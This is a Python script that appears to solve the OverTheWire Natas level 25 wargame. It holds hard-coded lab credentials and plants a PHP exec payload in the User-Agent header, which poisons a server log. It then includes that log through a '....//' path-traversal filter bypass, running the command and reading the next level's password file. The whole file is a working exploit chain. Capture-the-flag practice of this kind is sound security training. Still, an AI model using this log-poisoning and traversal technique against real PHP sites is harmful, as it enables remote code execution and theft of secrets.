#!/usr/bin/python

import requests

auth = ("natas25", "GHF6X7YwACaYYssHVY05cFq83hRktl4c")

url = "http://natas25.natas.labs.overthewire.org?"

# Make an error and inject malicious php into log file
params = {
    "lang": "natas_webpass"
}
headers = {
    "User-Agent": "<?php echo exec(\"cat /etc/natas_webpass/natas26\"); ?>",
}
r = requests.get(url, params=params, auth=auth, headers=headers)


# Request log file
session_id = r.cookies.get("PHPSESSID")
# params["lang"] = "/var/www/natas/natas25/logs/natas25_" + session_id + ".log"
params["lang"] = "....//logs/natas25_" + session_id + ".log"
rs = requests.get(url, params=params, auth=auth)
print(rs.text)
